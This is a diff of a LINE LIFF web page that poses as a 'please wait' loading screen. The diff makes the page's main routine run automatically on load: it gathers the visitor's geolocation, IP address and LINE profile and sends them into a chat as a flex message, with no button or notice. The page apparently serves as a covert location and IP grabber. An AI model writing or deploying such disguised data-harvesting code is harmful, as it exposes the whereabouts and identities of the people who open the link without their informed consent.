@@ -5,15 +5,14 @@
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DEMOs1</title>
+    <title>DEMO1</title>
 </head>
 
 <body>
     <!-- <p style="text-align: center;"><img src="https://cliply.co/wp-content/uploads/2021/02/392102850_EARTH_EMOJI_400px.gif" alt="aa"></p> -->
-    <p style="text-align: center;"><b>โปรดรอสักครู่นะครับ...</b></p>
-    <button onclick="sendMSG()">ลงทะเบียน</button>
+    <p style="text-align: center;"><b>pleasewait...</b></p>
 
-    <script charset="utf-8" src="https://static.line-scdn.net/liff/edge/versions/2.5.0/sdk.js"></script>
+    <script charset="utf-8" src="https://static.line-scdn.net/liff/edge/versions/2.3.1/sdk.js"></script>
     <script>
 
         function getDateTime() {
@@ -46,12 +45,20 @@
             return theip
         }
 
-        async function sendMSG(){
+
+
+        async function main() {
+            await liff.init({ liffId: "1657002791-KpW47bGJ" }).then(function () {
+                alert('success')
+            }).catch((err) => {
+                alert(`error ${err}`)
+            })
             const loc = await getLocation()
             const dates = getDateTime()
             const ip = await getIP()
             const profile = await liff.getProfile()
             const my_json_locate = JSON.parse(loc)
+
 
             await liff.sendMessages([{
                 "type": "flex",
@@ -202,15 +209,17 @@
                         "paddingAll": "0px"
                     }
                 }
-            }])
-
+            }]).then(() => {
+                alert('ผ่าน')
+            }).catch((err) => {
+                alert(`error ${err}`)
+            })
             
-            liff.closeWindow()
-        }
-
-        async function main() {
-            await liff.init({ liffId: "1657002791-KpW47bGJ" })
-
+            // await liff.sendMessages([{
+            //     "type":"text",
+            //     "text":"ลงทะเบียน"
+            // }])
+            
         }
         main()
     </script>
